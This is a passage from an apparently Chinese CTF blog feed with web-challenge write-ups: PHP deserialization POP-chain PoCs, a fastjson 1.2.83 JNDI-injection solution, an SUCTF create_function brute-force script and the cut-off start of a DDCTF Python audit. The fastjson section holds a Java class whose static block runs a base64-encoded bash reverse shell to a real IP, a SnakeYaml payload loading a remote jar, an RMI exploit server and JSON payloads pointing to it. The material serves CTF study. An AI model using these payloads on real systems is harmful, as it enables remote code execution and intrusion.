<span class="keyword">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;y1 = new bei();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;b2 = new yang();</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> yang();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> cheng();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> bei();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;c1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;b1 = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag在phpinfo里</p>
<p><img src="https://img-blog.csdnimg.cn/807ee7def3754c8fbafc1dcbb5f5d26e.png" alt="img"></p>
<h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Test/&quot;</span>,get_class(<span class="keyword">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$fun</span> = <span class="keyword">new</span> Fun();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$fun</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">55410055464485123619498041307525</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="simple-json"><a href="#simple-json" class="headerlink" title="simple_json"></a>simple_json</h3><p>fastjson1.2.83</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目给的类似的payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;ldap://ip:port/Exp&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>各种信息搜集之后：</p>
<p>没有ELProcessor的时候： <a href="https://tttang.com/archive/1405/#toc_snakeyaml">https://tttang.com/archive/1405/#toc_snakeyaml</a></p>
<p>Yaml反序列化： <a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/rgwdc7#wpl31">https://www.yuque.com/jinjinshigekeaigui/qskpi5/rgwdc7#wpl31</a></p>
<p>由此先创建一个Exp恶意类，用于RCE，还有<code>META-INF/services/javax.script.ScriptEngineFactory</code> 文件，内容为<code>Exp</code> ，然后编译Exp类，生成jar包一起放到vps上</p>
<p><img src="https://img-blog.csdnimg.cn/63fd87881030485f9908399906171c88.png" alt="Untitled"></p>
<p>用python开启服务：</p>
<blockquote>
<p>python3 -m http.server –bind 0.0.0.0 8888</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hacked by ameuu&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getMimeTypes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getNames</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getParameter</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOutputStatement</span><span class="params">(String toDisplay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProgram</span><span class="params">(String... statements)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ScriptEngine <span class="title">getScriptEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地开启rmi服务，jar打包，放到vps上执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title">tomcat_snakeyaml</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        String yaml = <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\&quot;</span>&lt;http:<span class="comment">//82.156.2.166:8888/exp.jar\\&quot;]]]]&quot;&gt;;</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=load&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;a&quot;</span>, yaml));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rmi_port = <span class="number">1559</span>;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;82.156.2.166&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(rmi_port);</span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ResourceRef ref = tomcat_snakeyaml();</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后传入payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;ldap://82.156.2.166:1559/Exploit&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是没有成功连上，利用别的师傅写的<a href="https://github.com/huy4ng/JNDI-Injection-Bypass">工具</a>，把yaml函数写入工具之后打包，</p>
<blockquote>
<p>java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer 82.156.2.166</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/6551b934b4f049be8b0589fde5654f6b.png" alt="Untitled"></p>
<p>记得监听端口</p>
<p>最终payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;rmi://82.156.2.166:1097/ExecBySnakeYaml&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="https://img-blog.csdnimg.cn/b7290ffa38894a769b45660e2143d3ec.png" alt="Untitled"></p>
<blockquote>
<p>little_db在复现中……</p>
</blockquote>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第一周学习</title>
    <url>/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="SUCTF-annonymous"><a href="#SUCTF-annonymous" class="headerlink" title="[SUCTF]annonymous"></a>[SUCTF]annonymous</h4><ul>
<li>create_function</li>
</ul>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>0x01:审计</strong></p>
<p>首先利用<code>creat_function</code>创建了一个匿名函数，而eval函数中也实现了对该函数的调用，但是eval中创建的函数名用了<code>openssl_random_pseudo_bytes</code>函数，所以很难进行爆破</p>
<p>但是可以从匿名函数入手，因为create_function创建匿名函数时，该函数的名字会默认为<code>%00lambda_%d</code>，所以我们可以爆破后面的<code>%d</code>执行对应的匿名函数</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3f157adf-697c-4764-b2cc-994d24033869.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;$flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;go! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>

<p>就可以得到flag了</p>
<span id="more"></span>

<h4 id="DDCTF-homebrew-event-loop"><a href="#DDCTF-homebrew-event-loop" class="headerlink" title="[DDCTF]homebrew event loop"></a>[DDCTF]homebrew event loop</h4><ul>
<li>python代码审计</li>
</ul>
<p>打开页面，可以发现url上有不同的地方，然后还告诉了我们的信息：有多少钻石和分数，然后可以在e-shop里面购买钻石，并且可以点击Reset进行重置</p>
<p><img src="https://img-blog.csdnimg.cn/62440506dff64e97b32dab7e58f41e3c.png" alt="img"></p>
<p>之后直接看源码吧：</p>
<p><strong>0x01:审计+解题</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span> <span class="comment"># 获取flag</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br></pre></td></tr></table></figure>

<p>  -<code>trigger_event</code>函数用于将event元素加入session的log和执行队列中，实现对函数的执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span>  </span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event) <span class="comment"># </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: <span class="comment"># 如果log的长度大于5那么只截取最后五位</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]): <span class="comment"># 如果event的类型是列表，那么加入队列</span></span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event) <span class="comment"># 事件队列接入event元素</span></span><br></pre></td></tr></table></figure>

<p>  -<code>get_mid_str</code>函数用于在后面的<code>execute_event_loop</code>函数中截取用于执行的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):] <span class="comment"># 获取prefix所在索引加上prefix长度的值</span></span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] <span class="comment"># 获取postfix前面的字符串</span></span><br><span class="line">    <span class="keyword">return</span> haystack</span><br></pre></td></tr></table></figure>

<p>  -<code>execute_event_loop</code>函数用于执行url中我们用get传入的函数，而我们所利用的也是这个函数，因为我们想要执行多个函数，所以我们要利用trigger_event将我们想要执行的函数放入执行队列中，但是由于eval函数，所以要用%23绕过，之后再在每个要执行的函数之间用#进行分割就实现了多函数调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span> <span class="comment"># 执行url上面的action啦就是</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>: <span class="comment"># 当队列长度大于0时</span></span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># 获取元素</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]  <span class="comment"># 截取队列 索引为1之后的元素</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="comment"># 如果元素不是以xxx为开头，就跳出循环，找下一个event</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="comment"># 过滤被禁止的字符</span></span><br><span class="line">                <span 